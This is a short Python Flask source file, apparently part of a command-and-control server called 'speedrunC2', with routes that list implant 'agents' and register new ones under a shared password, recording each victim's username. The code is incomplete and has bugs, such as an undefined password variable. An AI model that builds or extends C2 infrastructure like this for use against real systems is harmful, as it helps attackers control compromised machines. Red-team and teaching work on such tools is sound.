from speedrunC2.app import app, db
from speedrunC2.models import Task, Agent
from speedrunC2.controllers import find_agent_by_id, make_job_id
from speedrunC2.wrappers import ch0nky_ua
from flask import request, jsonify

@app.route("/agents/list")
def list_agents() :
    agents = Agent.query.all()
    agent_ids = [i.agent_id  for i in agents]
    return jsonify(agent_ids)


# todo: use flask blueprints 
@app.route("/agents/register", methods=["POST"]) # <-- route 
def register():# <-- handler 
    #print(request)
    reg_data = request.json
    reg_password = reg_data.get("password")
    if password == reg_password:
        print("Authenticated!")
    else:
        return jsonify({"status": "Failed", "message": "Bad password!"})

    whoami = reg_data.get("whoami")
    agent_id = reg_data.get("agent_id")
    agent =  Agent(agent_id = agent_id, username=whoami)
    db.session.add(agent)
    print(f"[+] A new agent {agent.id} has connected to our server! {agent.agent_id}, {agent.username}")

    db.session.commit()
    return jsonify({"status": "ok", "message": "Welcome!"})
